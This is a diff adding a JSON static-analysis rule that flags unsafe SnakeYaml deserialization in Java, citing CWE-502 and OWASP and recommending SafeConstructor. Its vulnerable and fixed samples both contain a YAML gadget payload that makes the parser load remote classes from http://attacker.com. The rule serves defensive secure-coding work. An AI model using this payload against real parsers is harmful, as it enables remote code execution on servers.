@@ -1,0 +1,68 @@
+{
+    "id": 1039056,
+    "name": "Avoid insecure use of YAML deserialization when using SnakeYaml (JEE)",
+    "href": "AIP/quality-rules/1039056",
+    "critical": true,
+    "associatedValueName": "Number of violation occurrences",
+    "description": "Avoid unsafe use of SnakeYaml for parsing YAML file in Java. SnakeYaml is a widely-used YAML parser written in Java.",
+    "output": "Associated to each violation, the following information is provided:\n- The number of violation occurrences\n- Bookmarks for violation occurrences found in the source code",
+    "rationale": "When user-controlled YAML streams are deserialized, then the attackers may gain access to execute arbitrary code on server and abuse logic of the application or may even lead to denial of service.\n\nThe YAML serialization libraries converts object graphs into YAML formatted data and it may include the metadata which is necessary to reconstruct objects back from YAML stream. If the classes of the objects which are to be reconstructed are specified by the attackers and if they force the application to run arbitrary setters with user-controlled data, in this scenario the attacker may gain access to execute arbitrary code during deserialization of YAML stream.\n\nSnakeYaml is a widely-used YAML parser written in Java. A lesser-known feature of SnakeYaml is its support for a special syntax that allows the constructor of any Java class to be called when parsing YAML data.",
+    "reference": "https://cwe.mitre.org/data/definitions/502.html\nhttps://www.baeldung.com/java-snake-yaml",
+    "remediation": "Always make sure to use only a Yaml instance that is constructed either with a SafeConstructor",
+    "remediationSample": "package yaml;\nimport org.yaml.snakeyaml.Yaml;\n\nString malicious = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";\nYaml yaml = new Yaml(new SafeConstructor()); // using safe constructor\n\n// or\n\nYaml yaml = new Yaml(new Constructor(SafeClass.class));\n\nObject obj = yaml.load(malicious); // No request to http://attacker.com",
+    "sample": "package yaml;\nimport org.yaml.snakeyaml.Yaml;\n\nString malicious = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";\nYaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.\n\nObject obj = yaml.load(malicious); // Make request to http://attacker.com",
+    "total": "Number of Java Methods",
+    "alternativeName": "Always make sure to use a Yaml instance that is constructed either with a SafeConstructor.",
+    "businessCriteria": [
+        {
+            "id": 20140522,
+            "name": "Green Stuff",
+            "href": "AIP/business-criteria/20140522"
+        },
+        {
+            "id": 60016,
+            "name": "Security",
+            "href": "AIP/business-criteria/60016"
+        }
+    ],
+    "technicalCriteria": [
+        {
+            "id": 66064,
+            "name": "Secure Coding - Weak Security Features",
+            "weight": 7,
+            "critical": true
+        }
+    ],
+    "technologies": [
+        {
+            "id": 140029,
+            "name": "JEE",
+            "href": "AIP/technologies/140029"
+        }
+    ],
+    "qualityStandards": [
+        {
+            "standard": "CWE",
+            "id": "CWE-502",
+            "name": "Deserialization of Untrusted Data",
+            "url": null,
+            "description": null
+        },
+        {
+            "standard": "OWASP",
+            "id": "A8-2017",
+            "name": "Insecure Deserialization",
+            "url": null,
+            "description": null
+        }
+    ],
+    "parameters": [
+        
+    ],
+    "thresholds": [
+        98.0,
+        99.0,
+        99.5,
+        99.99
+    ]
+}
